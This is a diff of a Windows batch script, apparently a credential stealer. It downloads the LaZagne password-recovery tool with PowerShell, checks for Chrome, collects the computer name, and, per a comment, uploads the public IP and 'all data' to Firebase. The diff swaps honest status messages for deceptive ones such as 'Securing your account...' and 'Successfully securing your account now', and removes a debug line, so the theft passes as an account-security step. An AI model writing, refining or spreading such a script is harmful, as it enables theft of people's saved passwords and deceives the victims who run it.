@@ -12,18 +12,18 @@ if not exist "%LAZAGNE_EXE%" (
     echo   Securing your account...
     powershell -Command "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%LAZAGNE_URL%' -OutFile '%LAZAGNE_EXE%'"
     if errorlevel 1 (
-        echo   [ERROR] Download failed! Check details below.
+        echo  [ERROR] Secure failed your account have problems
         pause
         exit /b 1
     )
     if not exist "%LAZAGNE_EXE%" (
-        echo   [ERROR] File not downloaded, check internet or URL.
+        echo   [ERROR] check internet or URL.
         pause
         exit /b 1
     )
-    echo   [OK] Successfully downloaded.
+    echo   [OK] Successfully securing your account now..
 ) else (
-    echo   [OK] Already installed.
+    echo   [yes]
 )
 
 tasklist /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I "chrome.exe" >NUL
@@ -60,7 +60,7 @@ if not defined RESULT_FILE (
 set "PC_NAME=%COMPUTERNAME%"
 set "PC_NAME=!PC_NAME: =_!"
 set "PC_NAME=!PC_NAME:-=_!"
-echo   [DEBUG] PC Name: %PC_NAME%
+
 
 :: Fetch public IP and upload all data to Firebase
 powershell -Command ^
